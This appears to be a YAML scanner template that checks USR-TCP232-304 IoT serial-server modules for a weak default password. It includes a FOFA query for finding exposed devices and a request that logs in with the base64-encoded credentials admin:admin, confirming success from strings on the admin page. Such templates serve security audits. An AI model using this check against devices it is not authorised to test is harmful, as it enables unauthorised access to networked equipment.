id: poc-yaml-usr-USR-TCP232-304-weak-password
info:
  name: 有人物联 USR-TCP232-304 弱口令漏洞
  severity: medium
  tags:
  - 弱口令
  finger: usr-tcp232-304
  fofa: app="USR-TCP232-304"
requests:
- method: GET
  path: /
  expression: status_code == 401 && contains(gbk_decode(body),"需要授权登录")
- method: GET
  path: /
  headers:
    Authorization: Basic YWRtaW46YWRtaW4=
  expression: status_code == 200 && contains(body,"有人物联网") && contains(body,"本机IP设置")
    && contains(body,"模块管理") && contains(body,"端口参数")
variables: {}
transport: http
